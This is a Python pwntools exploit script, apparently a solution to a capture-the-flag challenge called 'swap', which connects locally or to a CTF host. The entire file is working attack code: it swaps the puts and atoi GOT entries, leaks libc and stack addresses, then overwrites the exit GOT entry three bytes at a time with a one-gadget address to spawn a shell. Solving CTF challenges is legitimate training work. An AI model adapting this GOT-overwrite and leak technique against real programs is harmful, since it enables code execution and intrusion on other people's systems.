from pwn import *

context.log_level = 'DEBUG'

LOCAL = True
if LOCAL:
    r = process('./swap', env={'LD_LIBRARY_PATH': './'})
    gdb.attach(r, '''
    c
    ''')
else:
    r = remote('pwn1.chal.ctf.westerns.tokyo', 19937)


def swap(first, second):
    r.sendline('1')
    r.recv()
    r.sendline(str(first))
    r.recv()
    r.sendline(str(second))
    r.recv()

    r.send('2')

r.recv()

swap(0x601018, 0x601050) # puts and atoi

sleep(0.5)

r.send('A') # leak libc
libc = r.recv()[:-1] # chop off the trailing newline
libc = u64(libc + '\x00'*(8-len(libc))) - 0x3c5641
print "libc:", hex(libc)

r.send('A'*8) # overwrite libc addr to reach a stack var

stack = r.recvline().lstrip('A')[:-1]
stack = u64(stack + '\x00'*(8-len(stack)))
print "Stack:", hex(stack)

r.send('A\x00') # overwrite with 2 chars so that puts returns 2, swapping again so we're back to normal
r.recv()

final_addr = libc + 0x000000000f0274 # MAGIC

def gen_stack(offset):
    stack_addr = stack - 0x230
    stack_setup = str(stack_addr) + '\x00' # the number that will be parsed by atoll in the swap
    stack_setup += '\x00' * (8-len(stack_setup)) # padding

    stack_setup += p64(final_addr)[offset:] # the value that will get overwritten in the GOT entry
    return stack_setup

for offset in range(0, 8, 3):
    swap(0x601058+offset, gen_stack(offset)) # swap exit GOT with the stack contents. we can only fit 3 bytes at a time though (they get trampled on the stack), so we have to do this 3x to fill all 8 bytes
    r.recv()


r.sendline('0') # exit

print("Shell?")

r.interactive()
